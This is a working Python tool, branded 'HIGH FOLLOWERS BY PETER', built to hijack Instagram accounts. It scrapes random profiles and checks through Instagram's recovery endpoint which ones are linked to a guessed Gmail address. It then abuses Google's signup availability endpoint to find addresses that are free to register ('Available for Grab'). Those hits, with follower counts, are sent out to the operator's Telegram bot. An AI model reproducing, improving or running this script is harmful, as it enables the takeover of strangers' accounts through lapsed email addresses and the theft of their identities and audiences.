import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import init

init(autoreset=True)

# ================= DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Dashboard (app.py) ko hit/bad signal bhejna
        requests.post('http://127.0.0.1:5000/update_stats', json={'type': stat_type}, timeout=0.5)
    except:
        pass

# ID/Token setup (Dashboard passes these as arguments)
if len(sys.argv) > 2:
    ID = sys.argv[1]
    TOKEN = sys.argv[2]
else:
    ID = input("\033[1;36mEnter Telegram ID: ")
    TOKEN = input("\033[1;36mEnter Bot Token: ")
# =========================================================

# Terminal Colors
B = '\033[1;36;40m'; C1 = '\x1b[38;5;120m'; M = '\x1b[1;37m'; E = '\033[1;31m'
W9 = "\033[1m\033[34m"; R = '\033[1;31;40m'; RESET = "\033[0m"

ASCII_ART = r"""
██████╗░███████╗████████╗███████╗██████╗░
██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗░░░░░██║░░░█████╗░░██████╔╝
██╔═══╝░██╔══╝░░░░░██║░░░██╔══╝░░██╔══██╗
██║░░░░░███████╗░░░██║░░░███████╗██║░░██║
╚═╝░░░░░╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
           HIGH FOLLOWERS BY PETER
"""

print(C1 + ASCII_ART)

# Config
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
TOKEN_FILE = 'tl.txt'
jod_domain = '@gmail.com' 
stats_lock = Lock()

# Global Stats
hits_count = 0
bad_count = 0
valid_ig = 0
infoinsta = {}

def JodScript():
    """Initial Google Token Setup - Required for Gmail Checking"""
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        res1 = requests.get("https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB", headers=headers)
        match = re.search('data-initial-setup-data=".*?&quot;(.*?)&quot;', res1.text)
        if match:
            tok = match.group(1)
            host = ''.join(choice(alphabet) for _ in range(20))
            with open(TOKEN_FILE, 'w') as f: f.write(f"{tok}//{host}")
            print(C1 + "[*] Google Token Generated Successfully.")
        else:
            print(E + "[!] Token generation failed, retrying...")
            time.sleep(2)
            JodScript()
    except Exception as e:
        time.sleep(2)
        JodScript()

# Token setup on start
JodScript()

def check_gmail(email_prefix):
    global hits_count, bad_count
    try:
        with open(TOKEN_FILE, 'r') as f: tl, host = f.read().split('//')
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
        res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text: # Available for Grab
            with stats_lock: hits_count += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def check_instagram_link(email):
    global valid_ig, bad_count
    headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
    # Standard Instagram recovery payload
    data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
    try:
        res = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in res:
            valid_ig += 1
            if check_gmail(email.split('@')[0]):
                send_hit_telegram(email)
        else:
            # Not linked to Instagram
            send_to_dashboard('bad')
    except: pass

def send_hit_telegram(email):
    user = email.split('@')[0]
    info = infoinsta.get(user, {})
    msg = f"""
━━━━━━━━━━━━━━━
☄️ TEAM TX HIT FOUND!
👤 USER: {user}
📧 EMAIL: {email}
📈 FOLLOWERS: {info.get('follower_count', 'N/A')}
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={msg}")
    except: pass

def worker():
    while True:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        data = {
            'lsd': lsd,
            'variables': json.dumps({'id': random.randrange(2500000000, 21254029834), 'render_surface': 'PROFILE'}),
            'doc_id': '25618261841150840'
        }
        try:
            res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
            user_data = res.json().get('data', {}).get('user', {})
            username = user_data.get('username')
            if username and user_data.get('media_count', 0) > 0:
                infoinsta[username] = user_data
                check_instagram_link(username + jod_domain)
        except: pass

def display_stats():
    while True:
        print(f"\r ☄️ {B}| {C1}Hits: {M}{hits_count} {E}Bad: {M}{bad_count} {W9}IG-Found: {M}{valid_ig} {R}|{RESET}", end='')
        time.sleep(1)

# Execution
Thread(target=display_stats, daemon=True).start()
for _ in range(50): 
    Thread(target=worker, daemon=True).start()

# Keep script alive for dashboard background process
while True:
    time.sleep(10)